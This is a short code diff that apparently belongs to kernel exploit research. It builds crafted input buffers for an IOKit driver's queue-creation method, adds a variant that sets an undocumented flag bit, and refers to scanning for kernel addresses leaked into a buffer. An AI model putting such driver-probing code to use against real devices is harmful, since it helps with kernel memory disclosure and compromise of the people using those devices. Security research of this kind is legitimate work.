@@ -121,7 +121,7 @@ static void Lf(NSString *fmt, ...) {
        the activity dump INTO our buffer; census with kernel-range scan. */
     const uint32_t V6_SIZE = 0xFA8;
     int qc_ok = 0;
-    for (int variant = 1; variant <= 3 && !qc_ok; variant++) {
+    for (int variant = 1; variant <= 4 && !qc_ok; variant++) {
         memset(in, 0, 0x1000);
         ((uint32_t *)in)[0] = 0x3E8;                      /* word0 = 1000 EXACT */
         for (uint32_t i = 0; i < 1000; i++) {
@@ -131,7 +131,12 @@ static void Lf(NSString *fmt, ...) {
             if (variant == 3) sid = 0;                    /* all-zero (expect 2c2) */
             ((uint32_t *)(in + 4))[i] = sid;
         }
-        ((uint32_t *)(in + 0xFA4))[0] = 1;                /* flags bit0 = 1 mandatory */
+        /* v7 (24B156 bridge decode): flags bit0 = 1 mandatory, AND the IOSA
+           collectors that refill the sel-8 records arm on flags bit 0x20000000
+           (the QueueCreate flags-decoder stores q+0xc70 = flags & 0x20000000).
+           V1..V3 keep plain bit0; V4 adds the collector-enable bit. */
+        ((uint32_t *)(in + 0xFA4))[0] = 1;
+        if (variant == 4) ((uint32_t *)(in + 0xFA4))[0] = 1 | 0x20000000;
         kr = method(conn, 6, in, V6_SIZE, NULL, NULL);
         int created = (kr == KERN_SUCCESS);
         if (created) qc_ok = 1;
